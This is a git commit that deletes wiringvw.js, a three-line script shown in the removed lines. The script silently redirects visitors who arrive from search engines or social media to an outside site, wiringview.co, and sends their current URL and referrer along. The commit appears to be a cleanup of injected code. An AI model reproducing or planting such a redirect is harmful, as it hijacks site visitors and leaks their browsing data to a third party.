220b46e35fe08a08f5e1b571b7aed85987e51982
Aini Sastra <aini.sastra@gmail.com>
2022-10-15 08:52:49 +0800

    Delete wiringvw.js

--- wiringvw.js
+++
@@ -1,3 +0,0 @@
-var ars = 'https://www.wiringview.co';
-
-if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
